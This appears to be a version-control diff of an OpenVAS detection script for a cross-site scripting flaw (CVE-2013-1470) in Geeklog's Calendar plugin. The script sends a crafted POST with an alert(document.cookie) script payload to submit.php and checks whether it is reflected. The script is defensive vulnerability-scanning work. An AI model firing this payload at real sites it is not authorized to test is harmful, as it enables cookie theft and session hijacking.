@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_geeklog_calendar_plugin_xss_vuln.nasl 6692 2017-07-12 09:57:43Z teissa $
+# $Id: gb_geeklog_calendar_plugin_xss_vuln.nasl 9086 2018-03-12 11:54:08Z cfischer $
 #
 # Geeklog Calendar Plugin Cross Site Scripting Vulnerability
 #
@@ -27,27 +27,33 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.804237");
-  script_version("$Revision: 6692 $");
+  script_version("$Revision: 9086 $");
   script_cve_id("CVE-2013-1470");
   script_bugtraq_id(58209);
   script_tag(name:"cvss_base", value:"4.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2017-07-12 11:57:43 +0200 (Wed, 12 Jul 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-03-12 12:54:08 +0100 (Mon, 12 Mar 2018) $");
   script_tag(name:"creation_date", value:"2014-02-13 18:21:52 +0530 (Thu, 13 Feb 2014)");
   script_name("Geeklog Calendar Plugin Cross Site Scripting Vulnerability");
 
   script_tag(name : "summary" , value : "This host is running Geeklog and is prone to cross site scripting
   vulnerability.");
+
   script_tag(name : "vuldetect" , value : "Send a crafted exploit string via HTTP POST request and check whether it is
   able to read the string or not.");
+
   script_tag(name : "insight" , value : "The flaw is due to input passed via the 'calendar_type' parameter to
   'submit.php', which is not properly sanitised before using it.");
+
   script_tag(name : "impact" , value : "Successful exploitation will allow remote attackers to steal the victim's
   cookie-based authentication credentials.
 
   Impact Level: Application");
+
   script_tag(name : "affected" , value : "Geeklog 1.8.2 and 2.0.0, Other versions may also be affected.");
+
   script_tag(name : "solution" , value : "Upgrade to version 1.8.2sr1, 2.0.0rc2 or later,
+
   For updates refer to https://www.geeklog.net");
 
   script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/82326");
@@ -56,7 +62,7 @@ if(description)
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
   script_family("Web application abuses");
-  script_dependencies("find_service.nasl");
+  script_dependencies("find_service.nasl", "http_version.nasl");
   script_require_ports("Services/www", 80);
   script_exclude_keys("Settings/disable_cgi_scanning");
 
@@ -66,60 +72,41 @@ if(description)
   exit(0);
 }
 
-
-##
-## The script code starts here
-##
-
 include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
 
-## Variable Initialization
-url = "";
-geekPort = "";
-geekReq = "";
-geekRes = "";
-
-## Get HTTP Port
 geekPort = get_http_port(default:80);
 
-## Check Host Supports PHP
 if(!can_host_php(port:geekPort)){
   exit(0);
 }
 
-host = http_host_name(port:geekPort);
-
-## Iterate over possible paths
 foreach dir (make_list_unique("/", "/geeklog", "/cms", "/blog", cgi_dirs(port:geekPort)))
 {
 
   if(dir == "/") dir = "";
 
-  ## Send and Receive the response
   geekReq = http_get(item:dir + "/admin/moderation.php", port:geekPort);
-  geekRes = http_keepalive_send_recv(port:geekPort, data:geekReq, bodyonly:TRUE);
+  geekRes = http_keepalive_send_recv(port:geekPort, data:geekReq);
 
-  ## Confirm the application before trying exploit
   if("geeklog.net" >< geekRes && "Username:" >< geekRes && "Password:" >< geekRes)
   {
-    ## Send crafted request and receive the response
+
     url = dir + "/submit.php?type=calendar";
 
     payload = "mode=Submit&calendar_type=%22%3E%3Cscript%3Ealert%28document" +
               ".cookie%29%3B%3C%2Fscript%3E";
+    host = http_host_name(port:geekPort);
     geekReq = string("POST ",url," HTTP/1.0\r\n",
-                 "Host: " + host + "\r\n",
+                 "Host: ", host, "\r\n",
                  "Connection: keep-alive\r\n",
                  "Content-Type: application/x-www-form-urlencoded\r\n",
                  "Content-Length: ",strlen(payload), "\r\n\r\n",
                  payload);
+    geekRes = http_keepalive_send_recv(port:geekPort, data:geekReq, bodyonly:FALSE);
 
-    geekRes = http_keepalive_send_recv(port:geekPort, data:geekReq);
-
-    ## Confirm exploit worked by checking the response
-    if(geekRes =~ "HTTP/1\.. 200" && "><script>alert(document.cookie);</script>" >< geekRes)
+    if(geekRes =~ "^HTTP/1\.[01] 200" && "><script>alert(document.cookie);</script>" >< geekRes)
     {
       security_message(port:geekPort);
       exit(0);
